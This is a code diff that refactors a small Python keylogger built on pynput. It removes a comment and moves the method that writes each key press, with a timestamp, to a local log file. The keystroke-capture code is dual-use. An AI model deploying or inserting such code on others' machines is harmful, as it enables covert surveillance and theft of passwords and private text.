@@ -34,7 +34,6 @@ import logging
 from pynput.keyboard import Listener
 
 
-# read log file path from path.txt
 with open("path.txt", 'r') as f:
     LOG_FILE = f.read()
 
@@ -45,13 +44,13 @@ class KeyLogger:
         style = '%(asctime)s: %(message)s'        
         logging.basicConfig(filename=path, level=logging.DEBUG, format=style)
 
-    @staticmethod
-    def on_key_press(key):
-        logging.info(str(key))
-
     def start(self):
         with Listener(on_press=self.on_key_press) as listener:
             listener.join()
+
+    @staticmethod
+    def on_key_press(key):
+        logging.info(str(key))
 
 
 if __name__ == "__main__":
